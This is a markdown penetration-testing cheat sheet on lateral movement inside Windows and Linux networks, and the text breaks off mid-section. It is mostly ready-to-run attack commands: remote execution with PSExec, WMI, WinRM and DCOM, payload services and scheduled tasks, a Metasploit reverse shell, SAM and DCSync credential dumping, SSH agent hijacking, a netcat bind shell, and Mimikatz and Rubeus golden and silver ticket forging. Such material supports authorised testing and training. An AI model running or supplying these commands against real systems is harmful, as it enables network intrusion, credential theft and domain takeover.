# Lateral Movement

## 🎯 Goal

Use credentials, hashes, and tickets from one compromised host to gain **access to additional systems** and deepen control across the network.

---
## Table of Contents

1. [Strategy and Attack Graphs](#1-strategy-and-attack-graphs)
2. [Windows Lateral Movement](#2-windows-lateral-movement)
3. [Linux Lateral Movement](#3-linux-lateral-movement)
4. [AD-Specific Movement](#4-ad-specific-lateral-movement)
5. [Port Forwarding and Pivoting](#5-port-forwarding-and-pivoting)

---

## 📋 Phase Checklist

### Strategy & Visualization

- [ ] Visualize Nodes & Edges → [1.1](#11-network-visualization-concept)
- [ ] Identify High-Value Targets → [1.2](#12-high-value-target-prioritization)

### Windows Movement
- [ ] PSExec/SMB Exec → [2.1](#21-psexec-style-execution)
- [ ] WMI Lateral Move → [2.2](#22-wmi-based-movement)
- [ ] WinRM/PS Remoting → [2.3](#23-winrm-and-powershell-remoting)
- [ ] RDP Access → [2.4](#24-rdp-remote-desktop)
- [ ] Service Execution → [2.5](#25-service-based-execution)

### Linux Movement
- [ ] SSH Access/Keys → [3.1](#31-ssh-access)
- [ ] Harvest SSH Keys → [3.2](#32-ssh-agent-hijacking)

### AD-Specific Movement
- [ ] Pass-the-Hash (PtH) → [4.1](#41-pass-the-hash-pth-strategy)
- [ ] Pass-the-Ticket (PtT) → [4.2](#42-pass-the-ticket-ptt-movement)
- [ ] Golden/Silver Ticket → [4.2](#42-pass-the-ticket-ptt-movement)
- [ ] Hunt Admin Sessions → [4.3](#43-admin-session-exploitation)

---

## 📋 Pivoting Checklist

### Setup & Discovery
- [ ] Identify compromised host's network interfaces → [5](#5-port-forwarding-and-pivoting)
- [ ] Discover internal subnets → [5](#5-port-forwarding-and-pivoting)
- [ ] Choose tunneling method → [5](#5-port-forwarding-and-pivoting)

### Tunneling Methods
- [ ] Full subnet access (VPN-like) → [5.1](#51-ligolo-ng-recommended)
- [ ] Single service forwarding → [5](#5-port-forwarding-and-pivoting)
- [ ] SOCKS proxy for tools → [5](#5-port-forwarding-and-pivoting)
- [ ] Multi-hop pivoting → [5](#5-port-forwarding-and-pivoting)
---

## 1 Strategy and Attack Graphs

### 1.1 Network Visualization Concept

**Nodes & Edges Approach:**

- **🖥️ Nodes**: Machines (workstations, servers, DCs, network devices)
- **🔗 Edges**: Connection methods (SMB, WinRM, RDP, SSH, WMI)
- **🏷️ Labels**: Access levels (local admin, user, domain admin)

### 1.2 High-Value Target Prioritization

Focus movement on assets that shorten the path to domain impact:

1. 🎯 **Domain Controllers** - Highest value targets
2. 🏰 **Infrastructure Servers** - SQL, Exchange, File Servers
3. 💼 **Workstations with Admin Sessions** - Credential harvesting
4. 🔧 **Jump Servers** - Administrative access points
5. 📊 **Database Servers** - Data and credential storage

---

## 2 Windows Lateral Movement

### 2.1 PSExec-Style Execution

**Impacket PSExec (Linux)**

```bash
# Basic PSExec with password
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

# Pass-the-Hash
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
psexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# With specific command
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -c "whoami /all"
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami /all"

# Debug mode for troubleshooting
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -debug
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -debug

# With local authentication
impacket-psexec ./administrator:<PASSWORD>@<TARGET_IP>

# Using full hash format (LM:NTLM)
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes <LM_HASH>:<NTLM_HASH>
```

**CrackMapExec for Mass Execution**

```bash
# Scan and execute on multiple hosts
crackmapexec smb <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "whoami"
cme smb <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "whoami"

# Pass-the-Hash across subnet
crackmapexec smb <SUBNET_CIDR> -u <USER> -H <NTLM_HASH> -x "systeminfo"
cme smb <SUBNET_CIDR> -u <USER> -H <NTLM_HASH> -x "systeminfo"

# Execute PowerShell script
crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -X "Get-Process"
cme smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -X '$PSVersionTable'

# Dump SAM from multiple hosts
crackmapexec smb <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' --sam
cme smb <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' --sam

# Check local admin access
crackmapexec smb <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' --local-auth

# Using multiple usernames/passwords from files
crackmapexec smb <SUBNET_CIDR> -u users.txt -p passwords.txt --continue-on-success

# Execute command and save output
crackmapexec smb <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "ipconfig" --no-output
```

**Metasploit PSExec**

```bash
# Module for PSExec
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PASSWORD>
set SMBDomain <DOMAIN>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
exploit

# PSExec with Pass-the-Hash
use exploit/windows/smb/psexec
set SMBUser <USER>
set SMBPass <LM_HASH>:<NTLM_HASH>
set RHOSTS <TARGET_IP>
exploit
```

### 2.2 WMI-Based Movement

**Impacket WMIExec**

```bash
# WMI execution with credentials
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

# Pass-the-Hash via WMI
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
wmiexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# Interactive shell
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

# Single command execution
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami && ipconfig"
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami && hostname"

# With local authentication
impacket-wmiexec ./administrator:<PASSWORD>@<TARGET_IP>

# Silent mode (no output to stdout)
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -silentcommand
```

**PowerShell WMI (From Windows)**

```powershell
# Check WMI availability
Test-WSMan <TARGET_IP>

# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName <TARGET_IP>

# Get process list remotely
Get-WmiObject -Class Win32_Process -ComputerName <TARGET_IP>

# With credentials
$Username = '<DOMAIN>\<USER>'
$Password = '<PASSWORD>'
$SecPass = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($Username, $SecPass)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > <REMOTE_PATH>\output.txt" -ComputerName <TARGET_IP> -Credential $Cred

# Create persistent WMI connection
$Session = New-CimSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='whoami'}

# Query system information
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET_IP> | Select-Object Caption, Version, BuildNumber

# Get installed software
Get-WmiObject -Class Win32_Product -ComputerName <TARGET_IP>
```

**CrackMapExec WMI**

```bash
# WMI execution
crackmapexec wmi <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "whoami"
cme wmi <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "hostname"

# Pass-the-Hash via WMI
crackmapexec wmi <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "ipconfig"
```

### 2.3 WinRM and PowerShell Remoting

**Service Detection**

```bash
# Scan for WinRM ports
nmap -p <WINRM_PORTS> <SUBNET_CIDR>
nmap -p <WINRM_PORTS> -sV <SUBNET_CIDR>

# Check WinRM status remotely
crackmapexec winrm <SUBNET_CIDR> -u <USER> -p '<PASSWORD>'
cme winrm <SUBNET_CIDR> -u <USER> -p '<PASSWORD>'

# Enumerate WinRM with Metasploit
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS <SUBNET_CIDR>
run
```

**Evil-WinRM (Linux)**

```bash
# Basic WinRM connection
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

# With domain specification
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>

# Upload files during session
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>' -s <SCRIPTS_DIR> -e <EXES_DIR>

# SSL connection
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>' -S -P 5986

# Within Evil-WinRM session:
# Upload file
*Evil-WinRM* PS C:\> upload /local/path/file.exe <REMOTE_PATH>\file.exe

# Download file
*Evil-WinRM* PS C:\> download <REMOTE_PATH>\file.txt /local/path/file.txt

# Load PowerShell script
*Evil-WinRM* PS C:\> Invoke-Binary <EXES_DIR>\binary.exe

# Menu
*Evil-WinRM* PS C:\> menu
```

**PowerShell Remoting (From Windows)**

```powershell
# Test connectivity
Test-WSMan <TARGET_IP>
Test-WSMan -ComputerName <TARGET_IP> -Authentication Default

# Enter PSSession
Enter-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)

# Execute remote command
Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { whoami; systeminfo } -Credential (Get-Credential)

# Create persistent session
$Session = New-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
Invoke-Command -Session $Session -ScriptBlock { whoami }

# Multiple computers
Invoke-Command -ComputerName <TARGET_IP>,10.11.1.31,10.11.1.32 -ScriptBlock { Get-Service } -Credential (Get-Credential)

# Execute script file
Invoke-Command -ComputerName <TARGET_IP> -FilePath <REMOTE_PATH>\script.ps1 -Credential (Get-Credential)

# Copy item to remote session
Copy-Item -Path C:\local\file.txt -Destination <REMOTE_PATH>\ -ToSession $Session

# Copy item from remote session
Copy-Item -Path <REMOTE_PATH>\file.txt -Destination C:\local\ -FromSession $Session

# Enable PSRemoting (if you have access)
Enable-PSRemoting -Force

# Configure TrustedHosts (if needed)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<TARGET_IP>" -Force
```

**CrackMapExec WinRM**

```bash
# Execute commands via WinRM
crackmapexec winrm <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "whoami"
cme winrm <SUBNET_CIDR> -u <USER> -p '<PASSWORD>' -x "hostname"

# Pass-the-Hash via WinRM
crackmapexec winrm <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "ipconfig"

# Execute PowerShell command
crackmapexec winrm <TARGET_IP> -u <USER> -p '<PASSWORD>' -X '$env:computername'
```

### 2.4 RDP (Remote Desktop)

**Service Detection**

```bash
# Scan for RDP
nmap -p <RDP_PORT> <SUBNET_CIDR>
nmap -p <RDP_PORT> -sV --script rdp-enum-encryption <SUBNET_CIDR>

# Check RDP security
rdp-sec-check <TARGET_IP>

# Metasploit RDP scanner
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <SUBNET_CIDR>
run

# Check for BlueKeep vulnerability
nmap -p <RDP_PORT> --script rdp-vuln-ms12-020 <SUBNET_CIDR>
```

**xfreerdp (Linux)**

```bash
# Basic RDP connection
xfreerdp /u:<DOMAIN>\\<USER> /p:<PASSWORD> /v:<TARGET_IP> /dynamic-resolution /cert:ignore

# Alternative syntax
xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET_IP> /cert:ignore

# Pass-the-Hash (if supported - requires freerdp 2.0+)
xfreerdp /u:<DOMAIN>\\<USER> /pth:<NTLM_HASH> /v:<TARGET_IP> /dynamic-resolution /cert:ignore

# With specific domain
xfreerdp /u:<USER> /d:<DOMAIN> /p:<PASSWORD> /v:<TARGET_IP> /cert:ignore

# Multiple monitors and drive sharing
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> +home-drive /multimon

# Full screen mode
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> /f /cert:ignore

# Share local directory
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> /drive:share,<LOCAL_SHARE_DIR> /cert:ignore

# Custom resolution
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> /size:1920x1080 /cert:ignore

# Clipboard sharing
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> +clipboard /cert:ignore

# Network level authentication
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP> /sec:nla /cert:ignore
```

**rdesktop (Alternative)**

```bash
# Basic connection
rdesktop -u <USER> -p <PASSWORD> -d <DOMAIN> <TARGET_IP>

# Full screen
rdesktop -u <USER> -p <PASSWORD> -d <DOMAIN> -f <TARGET_IP>

# Custom geometry
rdesktop -u <USER> -p <PASSWORD> -g 1920x1080 <TARGET_IP>

# Sound redirection
rdesktop -u <USER> -p <PASSWORD> -r sound:local <TARGET_IP>

# Share directory
rdesktop -u <USER> -p <PASSWORD> -r disk:share=<LOCAL_SHARE_DIR> <TARGET_IP>
```

**RDP Session Management**

```powershell
# Check RDP sessions remotely
qwinsta /server:<TARGET_IP>
query user /server:<TARGET_IP>

# Log off specific session
rwinsta 1 /server:<TARGET_IP>
logoff 1 /server:<TARGET_IP>

# Enable RDP remotely (requires admin access)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Via registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable RDP firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Check RDP status
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
```

**CrackMapExec RDP**

```bash
# Check RDP access
crackmapexec rdp <SUBNET_CIDR> -u <USER> -p '<PASSWORD>'
cme rdp <SUBNET_CIDR> -u <USER> -p '<PASSWORD>'

# Screenshot capability
crackmapexec rdp <TARGET_IP> -u <USER> -p '<PASSWORD>' --screenshot
```

### 2.5 Service-Based Execution

**SC Manager Methods**

```powershell
# Create service remotely
sc \\<TARGET_IP> create "<SERVICE_NAME>" binPath= "cmd.exe /c <REMOTE_PATH>\payload.exe"
sc \\<TARGET_IP> start "<SERVICE_NAME>"
sc \\<TARGET_IP> delete "<SERVICE_NAME>"

# Query service status
sc \\<TARGET_IP> query "<SERVICE_NAME>"

# Create service with specific user
sc \\<TARGET_IP> create "<SERVICE_NAME>" binPath= "<REMOTE_PATH>\payload.exe" obj= "NT AUTHORITY\SYSTEM"

# Using WMI for service creation
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList @($null,$null,"<SERVICE_NAME>","<REMOTE_PATH>\payload.exe",16,$null,$null,$null,$null,$null,$null) -ComputerName <TARGET_IP>

# PowerShell service creation
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<REMOTE_PATH>\payload.exe" -ComputerName <TARGET_IP> -StartupType Manual
Start-Service -Name "<SERVICE_NAME>" -ComputerName <TARGET_IP>
Remove-Service -Name "<SERVICE_NAME>" -ComputerName <TARGET_IP>
```

**Impacket Services**

```bash
# Impacket services execution
impacket-services <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> list
impacket-services <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> start <SERVICE_NAME>
impacket-services <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> stop <SERVICE_NAME>

# Create and start service
impacket-services <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> create -name <SERVICE_NAME> -display "Temp Service" -path "<REMOTE_PATH>\payload.exe"
impacket-services <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> start <SERVICE_NAME>
```

**SchTasks for Execution**

```powershell
# Create scheduled task remotely
schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00 /ru "SYSTEM"

# Run task immediately
schtasks /run /s <TARGET_IP> /tn "<TASK_NAME>"

# Delete task
schtasks /delete /s <TARGET_IP> /tn "<TASK_NAME>" /f

# Create task with specific user
schtasks /create /s <TARGET_IP> /u <DOMAIN>\<USER> /p <PASSWORD> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00

# List tasks
schtasks /query /s <TARGET_IP> /fo LIST /v

# Create task that runs at logon
schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc onlogon /ru "SYSTEM"

# Run with highest privileges
schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00 /rl HIGHEST
```

**Impacket AtExec**

```bash
# Execute command via Task Scheduler
impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami"
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami"

# Pass-the-Hash
impacket-atexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"
atexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"

# Execute command and retrieve output
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "powershell -c Get-Process"
```

**DCOM Execution**

```powershell
# MMC20.Application execution
$com = [Type]::GetTypeFromProgID("MMC20.Application","<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# ShellWindows DCOM
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)

# ShellBrowserWindow DCOM
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGET_IP>")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
```

**Impacket DcomExec**

```bash
# DCOM execution
impacket-dcomexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami"
dcomexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami"

# Pass-the-Hash
impacket-dcomexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"

# Specify DCOM object
dcomexec.py -object MMC20 <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
```

---

## 3 Linux Lateral Movement

### 3.1 SSH Access

**Basic SSH Connections**

```bash
# Password authentication
ssh user@10.11.2.10

# Key-based authentication
ssh -i /path/to/private_key user@10.11.2.10

# Specific port
ssh -p 2222 user@10.11.2.10

# With command execution
ssh user@10.11.2.10 "whoami; cat /etc/passwd"

# Verbose mode for troubleshooting
ssh -v user@10.11.2.10
ssh -vv user@10.11.2.10
ssh -vvv user@10.11.2.10

# Disable host key checking (pentesting only)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@10.11.2.10

# X11 forwarding
ssh -X user@10.11.2.10

# Compression
ssh -C user@10.11.2.10

# Keep alive
ssh -o ServerAliveInterval=60 user@10.11.2.10
```

**SSH Key Management**

```bash
# Generate new key pair
ssh-keygen -t rsa -b 4096 -f /tmp/lateral_key
ssh-keygen -t ed25519 -f /tmp/lateral_key

# Generate with no passphrase
ssh-keygen -t rsa -b 4096 -f /tmp/lateral_key -N ""

# Copy public key to target
ssh-copy-id -i /tmp/lateral_key.pub user@10.11.2.10

# Manual key copy
cat /tmp/lateral_key.pub | ssh user@10.11.2.10 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Use specific key
ssh -i /tmp/lateral_key user@10.11.2.10

# Change key permissions (if needed)
chmod 600 /tmp/lateral_key
chmod 644 /tmp/lateral_key.pub

# Convert SSH key formats
ssh-keygen -p -m PEM -f /tmp/lateral_key
```

**SSH Config for Efficiency**

```bash
# ~/.ssh/config
Host target-server
    HostName 10.11.2.10
    User privileged-user
    Port 22
    IdentityFile ~/.ssh/lateral_key
    ServerAliveInterval 60
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    
Host jump-box
    HostName 10.11.1.100
    User jumpuser
    IdentityFile ~/.ssh/jump_key
    
Host internal-server
    HostName 10.11.3.50
    User root
    ProxyJump jump-box
    IdentityFile ~/.ssh/internal_key

# Usage
ssh target-server
ssh internal-server
```

**SSH Tunneling**

```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@10.11.2.10

# Remote port forwarding
ssh -R 8080:localhost:80 user@10.11.2.10

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@10.11.2.10

# Bind to all interfaces
ssh -D 0.0.0.0:1080 user@10.11.2.10

# Multiple port forwards
ssh -L 8080:localhost:80 -L 3306:localhost:3306 user@10.11.2.10

# Keep tunnel alive in background
ssh -f -N -L 8080:localhost:80 user@10.11.2.10
```

### 3.2 SSH Agent Hijacking

```bash
# Check for running SSH agent
echo "$SSH_AUTH_SOCK"
env | grep SSH

# List loaded keys
ssh-add -l

# Find SSH agent sockets
find /tmp -name "agent.*" 2>/dev/null
ps aux | grep ssh-agent

# Hijack SSH agent (if you have access to the socket)
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.12345
ssh-add -l

# Use agent for forwarding
ssh -A user@10.11.2.10

# Dump keys from agent (with appropriate access)
ps aux | grep ssh-agent
sudo gdb -p [PID]
call (char*)malloc(1000000)
dump memory /tmp/agent_dump 0x[ADDRESS] 0x[ADDRESS]+1000000
```


### 3.4 Alternative Linux Movement

**RSH/Rexec (Legacy)**

```bash
# If enabled (rare in modern systems)
rsh -l user 10.11.2.10 whoami
rexec -l user 10.11.2.10 whoami

# Check if rsh/rexec are available
which rsh rexec
netstat -ant | grep 512
netstat -ant | grep 513
netstat -ant | grep 514

# Scan for rsh services
nmap -p 512,513,514 10.11.2.0/24
```

**SSH Reverse Shells**

```bash
# Create reverse shell via SSH
ssh -R 8888:127.0.0.1:9998 user@10.11.2.10

# Remote port forwarding for access
ssh -R 3389:10.11.3.30:3389 user@10.11.2.10

# Reverse SOCKS proxy
ssh -R 1080 user@10.11.2.10

# Persistent reverse tunnel
autossh -M 0 -R 8888:localhost:22 user@10.11.2.10 -f -N

# Create reverse tunnel and execute commands
ssh -R 8888:localhost:22 user@10.11.2.10 "while true; do nc -l -p 9999 -e /bin/bash; done"
```

**Ansible for Lateral Movement**

```bash
# If Ansible is installed on compromised host
ansible all -i "10.11.2.10,10.11.2.20," -m shell -a "whoami" --user=root --ask-pass

# Using Ansible playbook
cat > lateral.yml << EOF
---
- hosts: all
  tasks:
    - name: Execute command
      shell: whoami
EOF

ansible-playbook -i "10.11.2.10," lateral.yml --user=root --ask-pass

# Check Ansible inventory files
find / -name "hosts" -o -name "inventory" 2>/dev/null
cat /etc/ansible/hosts
```

**Fabric (Python) for Automation**

```python
# If Fabric is available
from fabric import Connection

c = Connection('user@10.11.2.10')
result = c.run('whoami', hide=True)
print(result.stdout.strip())
```

**Screen/Tmux Session Hijacking**

```bash
# List screen sessions
screen -ls

# Attach to screen session (if permissions allow)
screen -x [session_id]

# List tmux sessions
tmux ls

# Attach to tmux session
tmux attach -t [session_name]

# Find screen sockets
find /var/run/screen -type d 2>/dev/null
ls -la /var/run/screen/S-*/

# Find tmux sockets
find /tmp/tmux-* 2>/dev/null
```

---

## 4 AD-Specific Lateral Movement

### 4.1 Pass-the-Hash (PtH) Strategy

**Understanding Pass-the-Hash**

```markdown
Pass-the-Hash allows authentication using NTLM hash without knowing the plaintext password.

Requirements:
- NTLM hash of the target account
- Target must accept NTLM authentication
- Account must have appropriate permissions on target system

Limitations:
- Does not work for domain-joined Azure AD accounts
- May not work if NTLMv2 is required
- Blocked by some security configurations
```

**Target Selection for PtH**

```bash
# Find systems where user has local admin
crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH --local-auth
cme smb 10.11.1.0/24 -u user -H NTLM_HASH
```

### 4.2 Pass-the-Ticket (PtT) Movement

**Understanding Kerberos Tickets**

```markdown
## Ticket Types
- **TGT (Ticket Granting Ticket)**: Used to request service tickets
- **TGS (Ticket Granting Service)**: Service-specific ticket
- **Golden Ticket**: Forged TGT with krbtgt hash (persistent)
- **Silver Ticket**: Forged TGS for specific service (stealthy)

## Ticket Formats
- **.kirbi**: Windows Mimikatz/Rubeus format
- **.ccache**: Linux format (Impacket)
```

**Ticket Harvesting (Windows)**

```powershell
# Mimikatz ticket export
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Export all tickets
mimikatz # kerberos::list /export

# Rubeus ticket harvesting
.\Rubeus.exe triage
.\Rubeus.exe dump
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Continuous harvesting
.\Rubeus.exe harvest /interval:30

# Monitor for specific user tickets
.\Rubeus.exe monitor /interval:5 /filteruser:administrator

# PowerShell ticket extraction
klist
klist purge
klist tgt
```

**Ticket Harvesting (Linux)**

```bash
# From keytab files
find / -name "*.keytab" 2>/dev/null
klist -k /path/to/file.keytab

# From ccache files
find / -name "*.ccache" 2>/dev/null
find /tmp -name "krb5cc_*" 2>/dev/null

# Export Kerberos ticket
export KRB5CCNAME=/tmp/krb5cc_1000

# List current tickets
klist

# Impacket ticket extraction from Windows
impacket-secretsdump domain.local/user:password@10.11.1.10 -just-dc-user krbtgt
```

**Ticket Conversion**

```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Convert .ccache to .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi

# Base64 encode/decode tickets (Rubeus format)
cat ticket.kirbi | base64 -w 0
echo "BASE64_TICKET" | base64 -d > ticket.kirbi
```

**Pass-the-Ticket Usage (Windows)**

```powershell
# Mimikatz PtT
mimikatz # kerberos::ptt admin_ticket.kirbi

# Multiple tickets
mimikatz # kerberos::ptt "C:\tickets\*.kirbi"

# Rubeus PtT
.\Rubeus.exe ptt /ticket:admin_ticket.kirbi

# Rubeus with base64 ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verify ticket injection
klist

# Use injected ticket
dir \\dc01.domain.local\C$
Enter-PSSession -ComputerName dc01.domain.local
```

**Pass-the-Ticket Usage (Linux)**

```bash
# Set ticket for use
export KRB5CCNAME=/path/to/admin_ticket.ccache

# Verify ticket
klist

# Use with Impacket
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local

impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-smbexec -k -no-pass domain.local/administrator@dc01.domain.local

# SMB access with ticket
impacket-smbclient -k -no-pass domain.local/administrator@dc01.domain.local
smbclient.py -k -no-pass //dc01.domain.local/C$ -k

# Get remote shell
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local

# DCSync with ticket
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local
```

**Golden Ticket Creation**

```powershell
# Mimikatz Golden Ticket
# First, get krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Create Golden Ticket
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /ptt

# With specific groups
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /groups:512,513,518,519,520 /ptt

# Save to file
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ticket:golden.kirbi

# Rubeus Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /user:Administrator /ptt

# Impacket Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator

export KRB5CCNAME=Administrator.ccache
```

**Silver Ticket Creation**

```powershell
# Mimikatz Silver Ticket (CIFS service)
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server01.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /user:Administrator /ptt

# Other services
# HTTP: /service:http
# LDAP: /service:ldap
# HOST: /service:host
# MSSQL: /service:mssqlsvc

# Rubeus Silver Ticket
.\Rubeus.exe silver /service:cifs/server01.domain.local /rc4:SERVICE_NTLM_HASH /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /ldap /user:Administrator /domain:domain.local /ptt

# Impacket Silver Ticket
